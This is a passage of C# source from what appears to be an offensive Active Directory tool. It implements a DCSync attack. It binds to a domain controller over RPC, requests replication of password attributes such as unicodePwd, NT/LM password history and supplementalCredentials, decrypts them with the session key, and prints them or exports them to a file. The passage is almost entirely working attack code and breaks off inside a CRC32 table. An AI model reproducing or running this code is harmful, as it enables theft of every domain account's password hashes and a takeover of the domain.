                0x02, 0x00, 0x00, 0x00, 0x94, 0xfc, 0xff, 0xff, 0x11, 0x00, 0x02, 0x00, 0x2b, 0x09, 0x29, 0x00, 0x08, 0x00, 0x01, 0x00, 0x02, 0x00, 0x28, 0x00, 0x01, 0x00, 0x02, 0x00, 0x00, 0x00, 0x16, 0x00,
                0xff, 0xff, 0x1a, 0x03, 0x28, 0x00, 0x00, 0x00, 0x08, 0x00, 0x36, 0x4c, 0x00, 0xe1, 0xfa, 0x5b, 0x12, 0x00, 0xf0, 0xff, 0x1a, 0x03, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4c, 0x00, 0xe4, 0xff,
                0x5c, 0x5b, 0x11, 0x04, 0x02, 0x00, 0x2b, 0x09, 0x29, 0x54, 0x18, 0x00, 0x01, 0x00, 0x02, 0x00, 0x28, 0x00, 0x01, 0x00, 0x02, 0x00, 0x00, 0x00, 0x82, 0xfc, 0xff, 0xff, 0x00
            };

        static string[] oids = {
            szOID_ANSI_name,
            szOID_ANSI_sAMAccountName, szOID_ANSI_userPrincipalName, szOID_ANSI_sAMAccountType,
            szOID_ANSI_userAccountControl, szOID_ANSI_accountExpires, szOID_ANSI_pwdLastSet,
            szOID_ANSI_objectSid, szOID_ANSI_sIDHistory,
            szOID_ANSI_unicodePwd, szOID_ANSI_ntPwdHistory, szOID_ANSI_dBCSPwd, szOID_ANSI_lmPwdHistory, szOID_ANSI_supplementalCredentials,
            szOID_ANSI_trustPartner, szOID_ANSI_trustAuthIncoming, szOID_ANSI_trustAuthOutgoing,
            szOID_ANSI_currentValue,
            szOID_isDeleted
        };

        static string[] oids_export = {
            szOID_ANSI_name,
            szOID_ANSI_sAMAccountName, szOID_ANSI_objectSid,
            szOID_ANSI_userAccountControl,
            szOID_ANSI_unicodePwd,
            szOID_isDeleted
        };

        private static byte[] SessionKey;
        static SecurityCallbackDelegate rpcSecurityCallbackDelegate;
        private delegate void SecurityCallbackDelegate(IntPtr context);


        static AllocMemoryFunctionDelegate allocMemoryFunctionDelegate;
        private delegate IntPtr AllocMemoryFunctionDelegate(int memsize);

        static FreeMemoryFunctionDelegate freeMemoryFunctionDelegate;
        private delegate void FreeMemoryFunctionDelegate(IntPtr memory);

        public static bool FinCredential(string domain, string dc, string user = null, string guid = null, string sid = null, string altservice = "ldap", bool alldata = false, string authuser = null, string authdomain = null, string authpassword = null, bool forcentlm = false)
        {
            IntPtr hBinding;
            Guid UserGuid;
            DRS_EXTENSIONS_INT DrsExtensionsInt;
            DRS_MSG_GETCHGREQ_V8 mSG_GETCHGREQ = new DRS_MSG_GETCHGREQ_V8();
            DRS_MSG_GETCHGREPLY_V6 mSG_GETCHGREPLY;
            IntPtr hDrs;
            DRS_EXTENSIONS_INT extensions;
            string exportpath = string.Empty;

            if (alldata)
            {
                exportpath = Path.GetTempPath() + DateTime.Now.ToString("ddMMyyyyHHmmss", DateTimeFormatInfo.InvariantInfo) + ".txt";
                FileStream outputfile = File.Create(exportpath);
                outputfile.Close();
                Console.WriteLine("[*] Output file will be {0}", exportpath);
            }

            Asn1_init();

            int rpcAuth = RPC_C_AUTHN_GSS_NEGOTIATE;
            if (forcentlm)
                rpcAuth = RPC_C_AUTHN_WINNT;

            hBinding = CreateBinding(dc, altservice, rpcAuth, authuser,authdomain,authpassword,forcentlm);

            if (hBinding != IntPtr.Zero)
            {
                if (DrsrGetDomainAndUserInfos(hBinding, dc, domain, user, guid, out mSG_GETCHGREQ.uuidDsaObjDest, out UserGuid, out DrsExtensionsInt, out extensions))
                {
                    int result = DrsrGetDCBind(hBinding, mSG_GETCHGREQ.uuidDsaObjDest, DrsExtensionsInt, out extensions, out hDrs);
                    if (result == 0)
                    {
                        DSNAME dsname = new DSNAME();
                        dsname.Guid = UserGuid;
                        IntPtr pdsName = AllocateMemory(Marshal.SizeOf(typeof(DSNAME)));
                        Marshal.StructureToPtr(dsname, pdsName, true);
                        mSG_GETCHGREQ.pNC = pdsName;
                        mSG_GETCHGREQ.ulFlags = DRS_INIT_SYNC | DRS_WRIT_REP | DRS_NEVER_SYNCED | DRS_FULL_SYNC_NOW | DRS_SYNC_URGENT;
                        mSG_GETCHGREQ.cMaxObjects = (uint)((alldata) ? 1000 : 1);
                        mSG_GETCHGREQ.cMaxBytes = 0x00a00000; // 10M
                        mSG_GETCHGREQ.ulExtendedOp = (uint)((alldata) ? 0 : 6);

                        PARTIAL_ATTR_VECTOR_V1_EXT partAttSet = new PARTIAL_ATTR_VECTOR_V1_EXT();
                        mSG_GETCHGREQ.PrefixTableDest = new SCHEMA_PREFIX_TABLE();
                        partAttSet.dwVersion = 1;
                        partAttSet.dwReserved1 = 0;

                        if (alldata)
                        {
                            partAttSet.cAttrs = (uint)oids_export.Length;
                            partAttSet.rgPartialAttr = new uint[oids.Length];

                            for (int i = 0; i < partAttSet.cAttrs; i++)
                                DrsrMakeAttid(ref mSG_GETCHGREQ.PrefixTableDest, oids_export[i], ref partAttSet.rgPartialAttr[i]);
                        }
                        else
                        {
                            partAttSet.cAttrs = (uint)oids.Length;
                            partAttSet.rgPartialAttr = new uint[oids.Length];

                            for (int i = 0; i < partAttSet.cAttrs; i++)
                                DrsrMakeAttid(ref mSG_GETCHGREQ.PrefixTableDest, oids[i], ref partAttSet.rgPartialAttr[i]);
                        }

                        mSG_GETCHGREQ.pPartialAttrSet = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(PARTIAL_ATTR_VECTOR_V1_EXT)));
                        Marshal.StructureToPtr(partAttSet, mSG_GETCHGREQ.pPartialAttrSet, false);

                        do
                        {
                            mSG_GETCHGREPLY = new DRS_MSG_GETCHGREPLY_V6();

                            result = GetReplicatioData(hDrs, alldata, ref mSG_GETCHGREQ, ref mSG_GETCHGREPLY);
                            if (result == 0)
                            {
                                MarshalReplicationData(mSG_GETCHGREPLY, alldata, exportpath);

                                if (alldata)
                                {
                                    mSG_GETCHGREQ.uuidInvocIdSrc = mSG_GETCHGREPLY.uuidInvocIdSrc;
                                    mSG_GETCHGREQ.usnvecFrom = mSG_GETCHGREPLY.usnvecTo;
                                }
                            }
                            else
                            {
                                Console.WriteLine("[x] Error getting replication data: {0}", result);
                                return false;
                            }
                        } while (Convert.ToBoolean(mSG_GETCHGREPLY.fMoreData));
                    }
                    else
                    {
                        Console.WriteLine("[x] Error DC bind: {0}", result);
                    }
                }
            }
            else
            {
                Console.WriteLine("[x] Error CreateBind");
            }

            Asn1_term();

            if (alldata)
            {
                Console.WriteLine("[*] Replication data exported");
            }

            return true;
        }

        private static int GetReplicatioData(IntPtr hDrs, bool alldata, ref DRS_MSG_GETCHGREQ_V8 mSG_GETCHGREQ, ref DRS_MSG_GETCHGREPLY_V6 mSG_GETCHGREPLY)
        {
            uint dwOutVersion = 0;

            IntPtr result = NdrClientCall2_5(GetStubPtr(4, 0), GetProcStringPtr(134), hDrs, 8, mSG_GETCHGREQ, ref dwOutVersion, ref mSG_GETCHGREPLY);

            return (int)result.ToInt64();
        }

        private static void DrsrMakeAttid(ref SCHEMA_PREFIX_TABLE prefixTable, string szOid, ref uint att)
        {
            uint lastValue;
            uint ndx = 0;
            string lastValueString;
            OssEncodedOID oidPrefix;

            try
            {
                lastValueString = szOid.Substring(szOid.LastIndexOf(".") + 1);
                lastValue = UInt32.Parse(lastValueString);

                att = (ushort)(lastValue % 0x4000);
                if (att >= 0x4000)
                    att += 0x8000;

                if (DotVal2Eoid(szOid, out oidPrefix))
                {
                    oidPrefix.length -= (ushort)((lastValue < 0x80) ? 1 : 2);

                    if (DrsrMakeAttidAddPrefixToTable(ref prefixTable, ref oidPrefix, ref ndx))
                        att = (ushort)(att | ndx << 16);
                    else
                        Console.WriteLine("DrsrMakeAttidAddPrefixToTable");
                }
                else
                    Console.WriteLine("DotVal2Eoid");
            }
            catch (Exception e)
            {
                Console.WriteLine("DrsrMakeAttidAddPrefixToTable " + e.Message);
                Console.WriteLine("DrsrMakeAttidAddPrefixToTable " + e.StackTrace);
            }
        }

        private static void FreeEnc(IntPtr pBuf)
        {
            if (!ASN1enc.Equals(default(ASN1encoding_s)) && pBuf != IntPtr.Zero)
                ASN1_FreeEncoded(ref ASN1enc, pBuf);
        }

        private static bool DotVal2Eoid(string dotOID, out OssEncodedOID encodedOID)
        {

            bool status = false;
            encodedOID = new OssEncodedOID();
            if (!ASN1enc.Equals(default(ASN1encoding_s)) && !string.IsNullOrEmpty(dotOID))
            {
                encodedOID.length = 0;
                encodedOID.value = IntPtr.Zero;

                IntPtr mt = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(ASN1encoding_s)));
                Marshal.StructureToPtr(ASN1enc, mt, false);

                IntPtr ot = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(OssEncodedOID)));
                Marshal.StructureToPtr(encodedOID, ot, false);

                status = ASN1BERDotVal2Eoid(mt, dotOID, ot);



                encodedOID = (OssEncodedOID)Marshal.PtrToStructure(ot, typeof(OssEncodedOID));

            }
            return status;
        }

        private static bool DrsrMakeAttidAddPrefixToTable(ref SCHEMA_PREFIX_TABLE prefixTable, ref OssEncodedOID oidPrefix, ref uint ndx)
        {
            bool status = false;
            IntPtr entries;

            if (!status)
            {
                ndx = prefixTable.PrefixCount;

                entries = Marshal.AllocHGlobal((int)(Marshal.SizeOf(typeof(PrefixTableEntry)) * (ndx + 1)));
                int size = Marshal.SizeOf(typeof(PrefixTableEntry));
                if (prefixTable.pPrefixEntry != null)
                {
                    for (int i = 0; i < ndx; i++)
                    {
                        PrefixTableEntry entry = (PrefixTableEntry)Marshal.PtrToStructure(IntPtr.Add(prefixTable.pPrefixEntry, i * size), typeof(PrefixTableEntry));
                        Marshal.StructureToPtr(entry, IntPtr.Add(entries, i * size), false);
                    }
                }

                PrefixTableEntry newentry = new PrefixTableEntry();
                newentry.ndx = ndx;
                newentry.prefix.length = oidPrefix.length;

                newentry.prefix.elements = Marshal.AllocHGlobal(oidPrefix.length);


                if (CopyMemory(oidPrefix.value, newentry.prefix.elements, oidPrefix.length))
                {
                    Marshal.StructureToPtr(newentry, IntPtr.Add(entries, (int)ndx * size), false);
                    prefixTable.pPrefixEntry = entries;
                    prefixTable.PrefixCount = prefixTable.PrefixCount + 1;
                    status = true;
                }

            }

            return status;
        }

        private static bool EqualMemory(IntPtr ptr1, IntPtr ptr2, int length)
        {
            for (int i = 0; i < length; i++)
            {
                if (Marshal.ReadByte(ptr1, i) != Marshal.ReadByte(ptr2, i))
                {
                    return false;
                }
            }
            return true;
        }

        private static bool CopyMemory(IntPtr src, IntPtr dest, int length)
        {

            try
            {
                byte[] tmpbyte = new byte[length];
                Marshal.Copy(src, tmpbyte, 0, length);
                Marshal.Copy(tmpbyte, 0, dest, length);
            }
            catch (Exception)
            {
                Console.WriteLine("Error Copy");
                return false;
            }
            return true;
        }

        static IntPtr hASN1Module = IntPtr.Zero;
        static ASN1encoding_s ASN1enc;
        static ASN1decoding_s ASN1dec;

        static IntPtr[] kull_m_asn1_encdecfreefntab = { IntPtr.Zero };
        static int[] kull_m_asn1_sizetab = { 0 };

        public static bool Asn1_init()
        {
            bool status = false;
            ASN1error_e ret;

            hASN1Module = ASN1_CreateModule((((1) << 16) | (0)), 1024, 4096, 1, kull_m_asn1_encdecfreefntab, kull_m_asn1_encdecfreefntab, kull_m_asn1_encdecfreefntab, kull_m_asn1_sizetab, (uint)1769433451);
            if (hASN1Module != IntPtr.Zero)
            {
                IntPtr s = IntPtr.Zero;

                IntPtr mt = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(ASN1encoding_s)));
                Marshal.StructureToPtr(ASN1enc, mt, false);
                ret = ASN1_CreateDecoder(hASN1Module, out mt, IntPtr.Zero, 0, s);
                ASN1enc = (ASN1encoding_s)Marshal.PtrToStructure(mt, typeof(ASN1encoding_s));

                if (ret < 0)
                {
                    Console.WriteLine("ASN1_CreateEncoder: {0}", ret);
                    ASN1enc = new ASN1encoding_s();
                }
                else
                {
                    IntPtr d = new IntPtr();
                    IntPtr mt2 = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(ASN1decoding_s)));
                    Marshal.StructureToPtr(ASN1dec, mt2, false);
                    ret = ASN1_CreateDecoder(hASN1Module, out mt2, IntPtr.Zero, 0, d);
                    ASN1dec = (ASN1decoding_s)Marshal.PtrToStructure(mt2, typeof(ASN1decoding_s));
                    if (ret < 0)
                    {
                        Console.WriteLine("ASN1_CreateDecoder: {0}", ret);
                        ASN1dec = new ASN1decoding_s();
                    }
                }
            }
            else
                Console.WriteLine("ASN1_CreateModule");

            status = (hASN1Module != IntPtr.Zero) && !ASN1enc.Equals(default(ASN1encoding_s)) && !ASN1dec.Equals(default(ASN1decoding_s));
            if (!status)
                Asn1_term();

            return status;
        }

        public static void Asn1_term()
        {
            if (hASN1Module != IntPtr.Zero)
            {
                ASN1_CloseModule(hASN1Module);
            }
        }

        public static IntPtr CreateBinding(string dc, string altservice, int rpcAuth, string authuser = null, string authdomain = null, string authpassword =null, bool forcentlm = false, bool nullsession = false)
        {
            IntPtr pStringBinding;
            IntPtr hBinding = IntPtr.Zero;
            NTSTATUS rpcStatus;

            rpcStatus = (NTSTATUS)RpcStringBindingCompose(null, "ncacn_ip_tcp", dc, null, null, out pStringBinding);
            if (rpcStatus == NTSTATUS.Success)
            {
                string stringBinding = Marshal.PtrToStringUni(pStringBinding);
                rpcStatus = (NTSTATUS)RpcBindingFromStringBinding(stringBinding, out hBinding);

                if (rpcStatus == NTSTATUS.Success && rpcAuth != RPC_C_AUTHN_NONE)
                {
                    RPC_SECURITY_QOS securityqos = new RPC_SECURITY_QOS();
                    securityqos.Version = 1;
                    securityqos.Capabilities = 1;
                    GCHandle qoshandle = GCHandle.Alloc(securityqos, GCHandleType.Pinned);

                    IntPtr psecAuth = IntPtr.Zero;
                    if(!string.IsNullOrEmpty(authuser))
                    {

                        SEC_WINNT_AUTH_IDENTITY_W secAuth = new SEC_WINNT_AUTH_IDENTITY_W
                        {
                            User = authuser,
                            Domain = authdomain,
                            Password = authpassword,
                            UserLength = authuser.Length,
                            DomainLength = authdomain.Length,
                            PasswordLength = authpassword.Length,
                            Flags = 2
                        };

                        psecAuth = Marshal.AllocHGlobal(Marshal.SizeOf(secAuth));
                        Marshal.StructureToPtr(secAuth, psecAuth, false);

                        if (secAuth.UserLength > 0)
                        {
                            Console.WriteLine("[!] [AUTH] Username: {0}", authuser);
                            Console.WriteLine("[!] [AUTH] Domain  : {0}", authdomain);
                            Console.WriteLine("[!] [AUTH] Password: {0}", authpassword);
                        }
                        
                    }
                    else if(nullsession)
                    {

                        SEC_WINNT_AUTH_IDENTITY_W secAuth = new SEC_WINNT_AUTH_IDENTITY_W
                        {
                            User = authuser,
                            Domain = authdomain,
                            Password = authpassword,
                            UserLength = 0,
                            DomainLength = 0,
                            PasswordLength = 0,
                            Flags = 2
                        };

                        psecAuth = Marshal.AllocHGlobal(Marshal.SizeOf(secAuth));
                        Marshal.StructureToPtr(secAuth, psecAuth, false);

                    }

                    if (forcentlm)
                    {
                        Console.WriteLine("[!] [AUTH] Explicit NTLM Mode");
                    }

                    rpcStatus = (NTSTATUS)RpcBindingSetAuthInfoEx(hBinding, altservice + "/" + dc, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, (uint)rpcAuth, psecAuth, 0, ref securityqos);
                    qoshandle.Free();
                    if (rpcStatus == 0)
                    {
                        rpcSecurityCallbackDelegate = RpcSecurityCallback;

                        rpcStatus = (NTSTATUS)RpcBindingSetOption(hBinding, RPC_C_OPT_SECURITY_CALLBACK, Marshal.GetFunctionPointerForDelegate(rpcSecurityCallbackDelegate));
                        if (rpcStatus != 0)
                        {
                            Console.WriteLine("[x] Error RpcBindingSetOption :  {0}", rpcStatus);
                            Unbind(hBinding);
                            hBinding = IntPtr.Zero;
                        }
                    }
                    else
                    {
                        Console.WriteLine("[x] Error RpcBindingSetAuthInfoEx :  {0}", rpcStatus);
                        Unbind(hBinding);
                        hBinding = IntPtr.Zero;
                    }

                }
                else
                {
                    if (rpcStatus != NTSTATUS.Success)
                        hBinding = IntPtr.Zero;
                }

            }
            else
            {
                Console.WriteLine("[x] Error RpcStringBindingCompose :  {0}", rpcStatus);
            }

            return hBinding;
        }

        private static void Unbind(IntPtr hBinding)
        {
            RpcBindingFree(ref hBinding);
        }

        private static void RpcSecurityCallback(IntPtr context)
        {
            NTSTATUS rpcStatus;
            NTSTATUS secStatus;
            if (SessionKey == null)
            {
                IntPtr SecurityContextHandle;
                SecPkgContext_SessionKey sessionKey = new SecPkgContext_SessionKey();
                rpcStatus = (NTSTATUS)I_RpcBindingInqSecurityContext(context, out SecurityContextHandle);
                if (rpcStatus == NTSTATUS.Success)
                {
                    secStatus = (NTSTATUS)QueryContextAttributes(SecurityContextHandle, SECPKG_ATTR_SESSION_KEY, ref sessionKey);
                    if (secStatus == NTSTATUS.Success)
                    {
                        SessionKey = new byte[sessionKey.SessionKeyLength];
                        Marshal.Copy(sessionKey.SessionKey, SessionKey, 0, (int)sessionKey.SessionKeyLength);
                        //Console.WriteLine(Utility.PrintHashBytes(SessionKey));
                    }
                    else
                    {
                        Console.WriteLine("[x] QueryContextAttributes {0}", secStatus);
                    }
                }
                else
                {
                    Console.WriteLine("[x] I_RpcBindingInqSecurityContext {0}", rpcStatus);
                }
            }

        }

        private static bool DrsrGetDomainAndUserInfos(IntPtr hBinding, string ServerName, string Domain, string User, string Guid, out Guid DomainGUID, out Guid UserGuid, out DRS_EXTENSIONS_INT DrsExtensionsInt, out DRS_EXTENSIONS_INT extensions)
        {

            NTSTATUS result;
            IntPtr hDrs;
            extensions = new DRS_EXTENSIONS_INT();
            DomainGUID = System.Guid.Empty;
            UserGuid = System.Guid.Empty;
            DrsExtensionsInt = new DRS_EXTENSIONS_INT();
            DrsExtensionsInt.cb = (uint)(Marshal.SizeOf(typeof(DRS_EXTENSIONS_INT)) - Marshal.SizeOf(typeof(uint)));
            DrsExtensionsInt.dwFlags = DRS_EXT_GETCHGREPLY_V6 | DRS_EXT_STRONG_ENCRYPTION;

            result = (NTSTATUS)DrsrGetDCBind(hBinding, new Guid("e24d201a-4fd6-11d1-a3da-0000f875ae0d"), DrsExtensionsInt, out extensions, out hDrs);

            if (result == NTSTATUS.Success)
            {
                result = (NTSTATUS)DrsDomainControllerInfo(hDrs, Domain, ServerName, out DomainGUID);

                if (result == NTSTATUS.Success)
                {
                    if (!string.IsNullOrEmpty(Guid))
                    {
                        UserGuid = new Guid(Guid);
                        return true;
                    }
                    else if (!string.IsNullOrEmpty(User))
                    {
                        if (DrsrCrackName(hDrs, User, out UserGuid) == 0)
                            return true;
                    }
                    else
                    {
                        byte[] pSid;
                        string strSid;
                        string pDomain;
                        if (GetSidDomainFromName(Domain, ServerName, out pSid, out pDomain))
                        {
                            if (ConvertSidToStringSid(pSid, out strSid))
                            {
                                if (DrsrCrackName(hDrs, strSid, out UserGuid, 11) == 0)
                                    return true;
                            }
                        }
                    }
                }
                else
                {
                    Console.WriteLine("[x] Error getting domain controller info: {0}", result);
                }
            }
            else
            {
                Console.WriteLine("[x] Error DC bind with default Guid: {0}", result);
            }

            return false;

        }

        private static int DrsrGetDCBind(IntPtr hBinding, Guid NtdsDsaObjectGuid, DRS_EXTENSIONS_INT extensions_in, out DRS_EXTENSIONS_INT extensions_out, out IntPtr hDrs)
        {
            IntPtr result = IntPtr.Zero;
            IntPtr pDrsExtensionsExt = new IntPtr();
            hDrs = new IntPtr();

            try
            {
                result = NdrClientCall2_2(GetStubPtr(4, 0), GetProcStringPtr(0), hBinding, NtdsDsaObjectGuid, extensions_in, ref pDrsExtensionsExt, ref hDrs);

                extensions_out = extensions_in;
                DRS_EXTENSIONS_INT extensions_out_temp = (DRS_EXTENSIONS_INT)Marshal.PtrToStructure(pDrsExtensionsExt, typeof(DRS_EXTENSIONS_INT));
                if (extensions_out_temp.cb > Marshal.OffsetOf(typeof(DRS_EXTENSIONS_INT), "SiteObjGuid").ToInt32())
                {
                    extensions_out.SiteObjGuid = extensions_out_temp.SiteObjGuid;
                    if (extensions_out_temp.cb > Marshal.OffsetOf(typeof(DRS_EXTENSIONS_INT), "dwReplEpoch").ToInt32())
                    {
                        extensions_out.dwReplEpoch = extensions_out_temp.dwReplEpoch;
                        if (extensions_out_temp.cb > Marshal.OffsetOf(typeof(DRS_EXTENSIONS_INT), "dwFlagsExt").ToInt32())
                        {
                            extensions_out.dwFlagsExt = extensions_out_temp.dwFlagsExt & 4;
                            if (extensions_out_temp.cb > Marshal.OffsetOf(typeof(DRS_EXTENSIONS_INT), "ConfigObjGUID").ToInt32())
                            {
                                extensions_out.ConfigObjGUID = extensions_out_temp.ConfigObjGUID;
                            }
                        }
                    }
                }
            }
            catch (SEHException)
            {
                extensions_out = new DRS_EXTENSIONS_INT();
                int ex = Marshal.GetExceptionCode();
                Console.WriteLine("[x] Error:" + ex);
                return ex;
            }
            return (int)result.ToInt64();
        }

        private static int DrsDomainControllerInfo(IntPtr hDrs, string domain, string serverName, out Guid NtdsDsaObjectGuid)
        {
            IntPtr result = IntPtr.Zero;
            DRS_MSG_DCINFOREQ_V1 dcInfoReq = new DRS_MSG_DCINFOREQ_V1
            {
                InfoLevel = 2,
                Domain = Marshal.StringToHGlobalUni(domain)
            };
            uint dcOutVersion = 0;
            uint dcInVersion = 1;
            DRS_MSG_DCINFOREPLY_V2 dcInfoRep = new DRS_MSG_DCINFOREPLY_V2();

            try
            {
                result = NdrClientCall2_3(GetStubPtr(4, 0), GetProcStringPtr(716), hDrs, dcInVersion, dcInfoReq, ref dcOutVersion, ref dcInfoRep);

                NtdsDsaObjectGuid = Guid.Empty;
                int size = Marshal.SizeOf(typeof(DS_DOMAIN_CONTROLLER_INFO_2W));
                for (uint i = 0; i < dcInfoRep.cItems; i++)
                {
                    DS_DOMAIN_CONTROLLER_INFO_2W info = (DS_DOMAIN_CONTROLLER_INFO_2W)Marshal.PtrToStructure(IntPtr.Add(dcInfoRep.rItems, (int)(i * size)), typeof(DS_DOMAIN_CONTROLLER_INFO_2W));
                    string infoDomain = Marshal.PtrToStringUni(info.DnsHostName);
                    string infoNetbios = Marshal.PtrToStringUni(info.NetbiosName);
                    if (serverName.StartsWith(infoDomain, StringComparison.InvariantCultureIgnoreCase) || serverName.StartsWith(infoNetbios, StringComparison.InvariantCultureIgnoreCase))
                    {
                        NtdsDsaObjectGuid = info.NtdsDsaObjectGuid;
                    }
                }
            }
            catch (SEHException)
            {
                NtdsDsaObjectGuid = Guid.Empty;
                int ex = Marshal.GetExceptionCode();
                return ex;
            }
            finally
            {
                Marshal.FreeHGlobal(dcInfoReq.Domain);
            }
            return (int)result.ToInt64();
        }

        private static uint DrsrCrackName(IntPtr hDrs, string Name, out Guid userGuid, uint formatOffered = 0)
        {
            IntPtr result = IntPtr.Zero;
            userGuid = Guid.Empty;

            DRS_MSG_CRACKREQ_V1 dcInfoReq = new DRS_MSG_CRACKREQ_V1();
            if (formatOffered == 0)
            {
                if (Name.Contains("\\"))
                    dcInfoReq.formatOffered = 2;
                else if (Name.Contains("="))
                    dcInfoReq.formatOffered = 1;
                else if (Name.Contains("@"))
                    dcInfoReq.formatOffered = 8;
                else
                    dcInfoReq.formatOffered = 0xfffffff9;
            }
            else
                dcInfoReq.formatOffered = formatOffered;

            dcInfoReq.formatDesired = 6;
            dcInfoReq.cNames = 1;
            IntPtr NameIntPtr = Marshal.StringToHGlobalUni(Name);
            GCHandle handle = GCHandle.Alloc(NameIntPtr, GCHandleType.Pinned);
            dcInfoReq.rpNames = handle.AddrOfPinnedObject();

            IntPtr dcInfoRep = IntPtr.Zero;
            uint dcInVersion = 1;
            uint dcOutVersion = 0;

            try
            {
                result = NdrClientCall2_4(GetStubPtr(4, 0), GetProcStringPtr(558), hDrs, dcInVersion, dcInfoReq, ref dcOutVersion, ref dcInfoRep);

                if (result == IntPtr.Zero)
                {
                    DS_NAME_RESULTW dsNameResult = (DS_NAME_RESULTW)Marshal.PtrToStructure(dcInfoRep, typeof(DS_NAME_RESULTW));
                    if (dsNameResult.cItems >= 1)
                    {
                        DS_NAME_RESULT_ITEMW item = (DS_NAME_RESULT_ITEMW)Marshal.PtrToStructure(dsNameResult.rItems, typeof(DS_NAME_RESULT_ITEMW));
                        if (item.status != 0)
                        {
                            userGuid = Guid.Empty;
                            result = new IntPtr(2);
                        }
                        else
                        {
                            string guidString = Marshal.PtrToStringUni(item.pName);
                            userGuid = new Guid(guidString);
                        }
                    }
                    else
                    {
                        userGuid = Guid.Empty;
                        result = new IntPtr(2);
                    }
                }
            }
            catch (SEHException)
            {
                int ex = Marshal.GetExceptionCode();
                return (uint)ex;
            }
            finally
            {
                handle.Free();
            }
            return (uint)result.ToInt64();
        }

        static bool GetSidDomainFromName(string pName, string system, out byte[] pSid, out string pDomain)
        {
            bool result = false;
            SID_NAME_USE sidNameUse;
            pSid = new byte[0];
            uint cbSid = 0, cchReferencedDomainName = 0;
            StringBuilder sbDomain = new StringBuilder();
            pDomain = "";

            if (!LookupAccountName(system, pName, null, ref cbSid, null, ref cchReferencedDomainName, out sidNameUse) && (Marshal.GetLastWin32Error() == 122))
            {
                pSid = new byte[cbSid];
                result = LookupAccountName(system, pName, pSid, ref cbSid, sbDomain, ref cchReferencedDomainName, out sidNameUse);
                if (result)
                {
                    pDomain = sbDomain.ToString();
                }
                else
                {
                    pDomain = "";
                    pSid = new byte[0];
                }
            }
            return result;
        }

        private static void MarshalReplicationData(DRS_MSG_GETCHGREPLY_V6 pmsgOut, bool alldata, string exportpath)
        {
            IntPtr pObjects = pmsgOut.pObjects;
            uint numObjects = pmsgOut.cNumObjects;

            REPLENTINFLIST list = (REPLENTINFLIST)Marshal.PtrToStructure(pObjects, typeof(REPLENTINFLIST));

            while (numObjects > 0)
            {
                Dictionary<int, object> replicationData = new Dictionary<int, object>();
                int size = Marshal.SizeOf(typeof(ATTR));
                for (uint i = 0; i < list.Entinf.AttrBlock.attrCount; i++)
                {
                    ATTR attr = (ATTR)Marshal.PtrToStructure(IntPtr.Add(list.Entinf.AttrBlock.pAttr, (int)(i * size)), typeof(ATTR));
                    int sizeval = Marshal.SizeOf(typeof(ATTRVAL));
                    List<byte[]> values = new List<byte[]>();
                    for (uint j = 0; j < attr.AttrVal.valCount; j++)
                    {
                        ATTRVAL attrval = (ATTRVAL)Marshal.PtrToStructure(IntPtr.Add(attr.AttrVal.pAVal, (int)(j * sizeval)), typeof(ATTRVAL));
                        byte[] data = new byte[attrval.valLen];
                        Marshal.Copy(attrval.pVal, data, 0, (int)attrval.valLen);

                        switch ((ATT)attr.attrTyp)
                        {
                            //case ATT.ATT_CURRENT_VALUE:
                            case ATT.ATT_UNICODE_PWD:
                            case ATT.ATT_NT_PWD_HISTORY:
                            case ATT.ATT_DBCS_PWD:
                            case ATT.ATT_LM_PWD_HISTORY:
                            case ATT.ATT_SUPPLEMENTAL_CREDENTIALS:
                                //case ATT.ATT_TRUST_AUTH_INCOMING:
                                //case ATT.ATT_TRUST_AUTH_OUTGOING:
                                data = DecryptReplicationData(data);
                                break;
                        }

                        values.Add(data);
                    }
                    if (values.Count == 1)
                    {
                        replicationData[(int)attr.attrTyp] = values[0];
                    }
                    else if (values.Count > 1)
                    {
                        replicationData[(int)attr.attrTyp] = values;
                    }
                }

                if (alldata)
                {
                    ExportReplicationData(replicationData, exportpath);
                }
                else
                {
                    PrintReplicationData(replicationData);
                }

                if (list.pNextEntInf != IntPtr.Zero)
                    list = (REPLENTINFLIST)Marshal.PtrToStructure(list.pNextEntInf, typeof(REPLENTINFLIST));

                numObjects--;

            }
        }


        static private uint[] dwCrc32Table = new uint[]
        {
                0x00000000, 0x77073096, 0xEE0E612C, 0x990951BA,
                0x076DC419, 0x706AF48F, 0xE963A535, 0x9E6495A3,
                0x0EDB8832, 0x79DCB8A4, 0xE0D5E91E, 0x97D2D988,
                0x09B64C2B, 0x7EB17CBD, 0xE7B82D07, 0x90BF1D91,
                0x1DB71064, 0x6AB020F2, 0xF3B97148, 0x84BE41DE,
                0x1ADAD47D, 0x6DDDE4EB, 0xF4D4B551, 0x83D385C7,
                0x136C9856, 0x646BA8C0, 0xFD62F97A, 0x8A65C9EC,
                0x14015C4F, 0x63066CD9, 0xFA0F3D63, 0x8D080DF5,
                0x3B6E20C8, 0x4C69105E, 0xD56041E4, 0xA2677172,
                0x3C03E4D1, 0x4B04D447, 0xD20D85FD, 0xA50AB56B,
                0x35B5A8FA, 0x42B2986C, 0xDBBBC9D6, 0xACBCF940,
                0x32D86CE3, 0x45DF5C75, 0xDCD60DCF, 0xABD13D59,
                0x26D930AC, 0x51DE003A, 0xC8D75180, 0xBFD06116,
                0x21B4F4B5, 0x56B3C423, 0xCFBA9599, 0xB8BDA50F,
                0x2802B89E, 0x5F058808, 0xC60CD9B2, 0xB10BE924,
                0x2F6F7C87, 0x58684C11, 0xC1611DAB, 0xB6662D3D,

                0x76DC4190, 0x01DB7106, 0x98D220BC, 0xEFD5102A,
                0x71B18589, 0x06B6B51F, 0x9FBFE4A5, 0xE8B8D433,
                0x7807C9A2, 0x0F00F934, 0x9609A88E, 0xE10E9818,
                0x7F6A0DBB, 0x086D3D2D, 0x91646C97, 0xE6635C01,
                0x6B6B51F4, 0x1C6C6162, 0x856530D8, 0xF262004E,
                0x6C0695ED, 0x1B01A57B, 0x8208F4C1, 0xF50FC457,
                0x65B0D9C6, 0x12B7E950, 0x8BBEB8EA, 0xFCB9887C,
                0x62DD1DDF, 0x15DA2D49, 0x8CD37CF3, 0xFBD44C65,
                0x4DB26158, 0x3AB551CE, 0xA3BC0074, 0xD4BB30E2,
                0x4ADFA541, 0x3DD895D7, 0xA4D1C46D, 0xD3D6F4FB,
